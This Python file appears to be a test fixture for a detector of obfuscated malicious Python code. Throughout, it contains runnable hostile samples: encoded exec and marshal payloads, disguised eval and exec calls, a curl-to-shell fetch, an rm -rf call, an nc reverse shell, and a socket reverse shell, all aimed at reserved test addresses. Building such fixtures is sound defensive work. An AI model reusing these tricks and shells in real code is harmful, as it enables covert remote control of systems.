#!/usr/bin/env python3
# python-obfuscation-suite.py — fixture for python-obfuscation.js coverage.
#
# Exercises all six branches (P1 zlib+b64 carrier, P2 marshal loads,
# P3 codecs.decode, P4 char-array reassembly, P5 builtin string-concat
# lookup, P6 subprocess/os.system/socket sinks). Network endpoints use
# RFC-2606 / TEST-NET reserved ranges.

import base64
import codecs
import os
import socket
import subprocess

# P1: exec(zlib.decompress(base64.b64decode(b'…'))) carrier.
# Cleartext: 'subprocess.run(["sh", "-c", "id"])'  (after inflate).
exec(__import__('zlib').decompress(__import__('base64').b64decode(
    b'eJwrSi3OL1JIzs8tKCotSS3KU0jSV6jmUlDQU/cHcvTUFRT0DDXVuQB7sgmK')))

# P2: exec(marshal.loads(base64.b64decode('…')))  ← bytecode dropper
exec(__import__('marshal').loads(base64.b64decode(
    'AwAAAOMAAAAAAAAAAAAAAAACAAAAQwAAAHMOAAAAZAB0AKMBoQEBAGQBUwApAg==')))

# P3: codecs.decode rot13 — 'rkrp' rot13 → 'exec'  (sensitivity gate fires)
f = getattr(__builtins__, codecs.decode('rkrp', 'rot_13'))
f("import os; os.system('id')")

# P3: codecs.decode hex — '6f732e73797374656d' hex → 'os.system'
target = codecs.decode('6f732e73797374656d', 'hex').decode()

# P4: chr-join reassembly → 'subprocess.run'  (recognised sink)
sink = ''.join([chr(115), chr(117), chr(98), chr(112), chr(114), chr(111),
                chr(99), chr(101), chr(115), chr(115), chr(46), chr(114),
                chr(117), chr(110)])

# P4: bytes-list reassembly → 'os.popen'
target2 = bytes([111, 115, 46, 112, 111, 112, 101, 110]).decode()

# P4: chr+chr concat → 'eval'
fn = chr(101) + chr(118) + chr(97) + chr(108)
fn("print('pwn')")

# P5: getattr(__builtins__, 'e' + 'val')  ← string-concat-builtin lookup
ev = getattr(__builtins__, 'e' + 'val')
ev("os.system('whoami')")

# P5: multi-fragment exec
ec = getattr(__builtins__, 'e' + 'x' + 'e' + 'c')
ec("import os; os.system('id')")

# P6: subprocess.run(['sh', '-c', '…']) sink with literal cleartext
subprocess.run(['sh', '-c', 'curl http://198.51.100.5/x | sh'])

# P6: subprocess.Popen with shell=True
subprocess.Popen("rm -rf /tmp/payload --no-preserve-root", shell=True)

# P6: os.system literal — captured cleartext goes through dangerousPatterns scoring
os.system("nc 192.0.2.1 4444 -e /bin/sh")

# P6: socket reverse-shell skeleton (heuristic detection — Python_Reverse_Shell YARA rule)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("203.0.113.5", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
__import__('pty').spawn("/bin/sh")
